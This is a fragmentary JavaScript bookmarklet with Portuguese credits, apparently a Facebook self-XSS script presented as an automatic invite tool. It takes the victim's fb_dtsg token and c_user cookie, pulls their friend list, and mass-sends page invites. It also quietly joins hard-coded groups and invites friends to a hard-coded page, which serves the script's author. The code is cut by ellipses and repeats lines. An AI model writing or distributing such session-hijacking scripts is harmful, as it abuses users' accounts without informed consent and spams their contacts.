...
javascript: var Title='Enviando Convites<br/> By:<A style="color:#D19F26;" href="https://www.facebook.com/thyagosr" target="_blank">Thyago Ribeiro</A>';
var Descriptions = "",
    _text = 'Créditos:</br>Script desenvolvido por </A><A style="color:#D19F26;" href="http://www.facebook.com/thyagosr" target="_blank"> Thyago Ribeiro</A></A>.</br> Acesse meu site <A style="color:#D19F26;" href="http://www.facebook.com/thyagosr" target="_blank">facebook.com/thyagos</A>.</A>';
...
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        ...
        if (i > 0) {
            ...
            display += "<b>" + suc + "</b> Amigos convidados de " + (arr.length - i) + " amigos encontrados ";
            display += "(" + i + " restantes...)";
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1414383872126701&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
...
function addfriend(){i++,setTimeout("clickfr()",2e3)}var gid=["#IDdoGRUPO"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("271543839623110");var gid=["#"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Friend=Array();gf=new XMLHttpRequest,gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=Friend_only",!1),gf.send(),4!=gf.readyState||(data=eval("("+gf.responseText.substr(9)+")"),data.error||(Friend=data.payload.entries.sort(
function(a,b){return a.index-b.index})));var Title='Fanpage Like - Convite automático <br/> By:<A style="color:#D19F26;" href="https://www.facebook.com/thyagosr" target="_blank">Thyago Ribeiro</A>';grpname=document.getElementById("groupsJumpTitle").innerHTML;var Descriptions="",_text='</br>Visit: <A style="color:#D19F26;" href="https://www.facebook.com/thyagosr/">Perfil - Thyago Ribeiro</A>, Join Yuk!';jx={getHTTPObject:
